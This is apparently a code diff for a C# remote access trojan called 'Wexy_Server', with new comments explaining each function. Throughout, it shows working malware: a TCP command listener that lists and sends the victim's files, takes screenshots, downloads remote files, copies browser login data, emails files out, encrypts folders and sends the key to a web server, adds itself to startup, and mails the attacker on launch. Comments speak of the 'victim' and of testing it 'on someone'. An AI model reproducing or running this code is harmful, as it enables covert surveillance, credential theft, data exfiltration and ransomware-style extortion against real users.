@@ -22,29 +22,14 @@ namespace Wexy_Server
         public static NetworkStream Receiver;
         public static NetworkStream Writer;
         public static TcpListener listenner ;
-        public static System.Threading.Thread Rec;
+        public static Thread Rec;
         public static TcpClient client;
         public static int port = 1702;
-
-
-        public static string GetWindowsPlatform()
-        {
-            OperatingSystem os = System.Environment.OSVersion;
-           // Console.WriteLine("OS Platform: {0}", os.Platform);
-            //Console.WriteLine("OS Service Pack: {0}", os.ServicePack);
-            //Console.WriteLine("OS Version: {0}", os.VersionString);
-            String subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
-            RegistryKey key = Registry.LocalMachine;
-            RegistryKey skey = key.OpenSubKey(subKey);
-           // Console.WriteLine("OS Name: {0}", skey.GetValue("ProductName"));
-            return skey.GetValue("ProductName").ToString();
-        }
-
 
         public static void ReceiveCommands()
         {
             
-            //Infinite loop 
+            //Infinite loop to receive commands
             while (true)
             {
                 Thread.Sleep(10);
@@ -62,10 +47,13 @@ namespace Wexy_Server
                     //Convert the packet into readable string
                     string command = Encoding.ASCII.GetString(RecPacket);
 
-                    //Split the command into two different strings based on the splitter we made, >
+                    //Split the command into different strings based on the splitter we made, >
                     string[] CommandArray = System.Text.RegularExpressions.Regex.Split(command, ">");
 
-                    //Get the actual command.
+                    //the commandand the parameters are separated by a ">"
+                    //CommandArray[0] -> actual command
+                    //CommandArray[1] -> first parameter 
+                    //CommandArray[2] -> second parameter etc.. 
                     command = CommandArray[0];
 
                     switch (command)
@@ -80,11 +68,6 @@ namespace Wexy_Server
                             //Open a website with Internet Explorer
                             string site = CommandArray[1];
                             OpenWebsite(site);
-                            break;
-
-                        case "pcname":
-                            //Get the computer name
-                            SendPCName();
                             break;
 
                         case "showfiles":
@@ -106,7 +89,7 @@ namespace Wexy_Server
                             break;
 
                         case "getFile":
-                            //Send a file to mail
+                            //Send a file to a mail adress
                             string filePath = CommandArray[1];
                              string sender = CommandArray[2];
                             string sender_pass = CommandArray[3];
@@ -115,7 +98,7 @@ namespace Wexy_Server
                             break;
 
                         case "openApp":
-                            //Open an application
+                            //Open an application or a file
                             string appName = CommandArray[1];
                             openApp(appName);
                             break;
@@ -137,19 +120,24 @@ namespace Wexy_Server
                             break;
 
                         case "screenshot":
+                            //Take a screenshot of the user interface and send it
                             SendScreenshot();
                             break;
 
                         case "killwexy":
+                            //Shut down Wexy 
                             KillWexy();
                             break;
 
                         case "remote":
+                            //Download a file with the given url
                             string url = CommandArray[1];
                             string fileName = CommandArray[2];
                             DownloadFile(url,fileName);
                             break;
+
                         case "encryptfolder":
+                            //Encrypt a given folder path and send the key to a running web server
                             string folderpath = CommandArray[1];
                             string webServerUrl = CommandArray[2];
                             EncryptFolder(folderpath,webServerUrl);
@@ -166,6 +154,7 @@ namespace Wexy_Server
         #region Commands
 
         // - ALMOST OK - 
+        //Encrypts a folder and send the key to a running web server using the method startAction()
         public static void EncryptFolder(string folderpath, string serverUrl)
         {
             try
@@ -183,9 +172,9 @@ namespace Wexy_Server
         }
 
         // - ALMOST OK - 
+        //Download a file with the given url and filename
         public static void DownloadFile(string url, string fileName)
         {
-            //Remote download on the victim's pc
             try
             {
                 WebClient wb = new WebClient();
@@ -201,13 +190,15 @@ namespace Wexy_Server
         }
 
         // - ALMOST OK - 
+        //Shut down wexy
         public static void KillWexy()
         {
-            //RemoveFromStartup();
+            //RemoveFromStartup(); 
             Environment.Exit(0);
         }
 
         // - ALMOST OK - [Sometimes the picture is not fully downloaded]
+        //Draw a screenshot and send it to the client
         public static void SendScreenshot()
         {
             Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -224,16 +215,17 @@ namespace Wexy_Server
         }
 
         // - ALMOST OK - [Files are not completely downloaded]
+        //Send a file
         public static void sendFile(string filePath)
         {
             FileInfo fileInfo = new FileInfo(filePath);
             Stream s = client.GetStream();
             byte[] filebytes = File.ReadAllBytes(filePath);
-            s.Write(filebytes, 0, filebytes.Length);
-            
+            s.Write(filebytes, 0, filebytes.Length);         
         }
        
         // - ALMOST OK - 
+        //Get the OS version name and send it
         public static void getOSVersion()
         {
             string osversion = GetWindowsPlatform();
@@ -243,6 +235,7 @@ namespace Wexy_Server
         }
 
         // - ALMOST OK - 
+        //Open a file or an application
         public static void openApp(string applicationName)
         {
             System.Diagnostics.Process app = new System.Diagnostics.Process();
@@ -251,7 +244,8 @@ namespace Wexy_Server
             app.Start();       
         }
 
-        // - ALMOST OK - crashes when trying to access protected folders like c:/users/welsen/cookies
+        // - ALMOST OK - crashes when trying to access protected folders like c:/users/<username>/cookies
+        //Send a list of subfolders from a given folder path
         public static void ListFolders(string location)
         {
             string[] xfolders = Directory.GetDirectories(location);
@@ -271,15 +265,14 @@ namespace Wexy_Server
                 {
                     folders = folders + item + "/\n";
                 }
-
                 byte[] Packet = Encoding.ASCII.GetBytes(folders);
                 Writer.Write(Packet, 0, Packet.Length);
                 Writer.Flush();
             }
-            
         }
 
         // - ALMOST OK - 
+        //Send a list of the files with a given folder path
         public static void ListFiles(string location)
         {
             string files = "";
@@ -304,25 +297,8 @@ namespace Wexy_Server
             }           
         }
 
-        // - ALMOST OK - [Multiple blank lines generated after the Computer name is received.]
-        public static void SendPCName()
-        {
-            try
-            {
-                string pcname = Environment.UserName;
-                byte[] Packet = Encoding.ASCII.GetBytes(pcname);
-                Writer.Write(Packet, 0, Packet.Length);
-                Writer.Flush();
-            }
-            catch
-            {
-                Console.WriteLine("client disconnected from server!");
-                Console.ReadKey();
-                Writer.Close();
-            }
-        }
-
-        // - ALMOST OK - [Crashes a few seconds after sending the file]
+        // - ALMOST OK - [Sometimes crashes a few seconds after sending the file]
+        //Send a mail with attachement(file chosen)
         public static void getFile(string location,string from, string password, string to)
         {
             try
@@ -359,6 +335,18 @@ namespace Wexy_Server
         }
 
         // - OK - 
+        //Get OS name
+        public static string GetWindowsPlatform()
+        {
+            OperatingSystem os = System.Environment.OSVersion;
+            String subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
+            RegistryKey key = Registry.LocalMachine;
+            RegistryKey skey = key.OpenSubKey(subKey);
+            return skey.GetValue("ProductName").ToString();
+        }
+
+        // - OK - 
+        //Get local IP adress
         public static string getLocalIP()
         {
             IPHostEntry host;
@@ -376,6 +364,8 @@ namespace Wexy_Server
         } 
 
         // - OK -
+        //Send a mail to the attacker when the server starts running
+        //You must configure it with your credentials.
         public static void alertAttacker()
         {
             //Configure the stmp client
@@ -394,6 +384,8 @@ namespace Wexy_Server
         }
 
         // - OK -
+        //Copy the LOGIN DATA file to another file with the .FILE extension. 
+        //I proceeded this way because sending a file without extension over TCP or via mail(STMP) doesn't work.
         public static void copyLoginData()
         {
             try
@@ -405,6 +397,7 @@ namespace Wexy_Server
         }
 
         // - OK - 
+        //Open a given website with internet explorer
         public static void OpenWebsite(string website)
         {
             System.Diagnostics.Process IE = new System.Diagnostics.Process();
@@ -415,18 +408,21 @@ namespace Wexy_Server
         }
 
         // - OK - 
+        //Display a given message
         public static void DisplayMessage(string message)
         {
             System.Windows.Forms.MessageBox.Show(message.Trim('\0'));
         }
 
         // - OK - 
+        //Delete a file with a given filename path
         public static void deleteFile(string location)
         {
             File.Delete(location);         
         }
 
         // - OK - 
+        //Add the exe to startup, so it starts automatically when the os starts up
         public static void addToStartup()
         {
             using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
@@ -450,14 +446,21 @@ namespace Wexy_Server
 
         static void Main(string[] args)
         {
-            
+            //If you want to test it on someome , remove the '//' from the two methods below, and 
+            //Change the output type to Windows Application instead of Console Application
+            //(Right click Wexy Server from Solutions explorer and go to properties. 
+
+
             //addToStartup();
             //alertAttacker();
 
+            //Start the tcp server
             listenner = new TcpListener(IPAddress.Any, port);
             listenner.Start();
 
             Console.WriteLine(getLocalIP() + ":" + port.ToString());
+            
+            //Infinite loop in another thread. 
             while (true)
             {
                 Thread.Sleep(200);
@@ -466,7 +469,7 @@ namespace Wexy_Server
 
                 Writer = client.GetStream();
 
-                Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
+                Rec = new Thread(new System.Threading.ThreadStart(ReceiveCommands));
                 Rec.Start();
             }    
         }
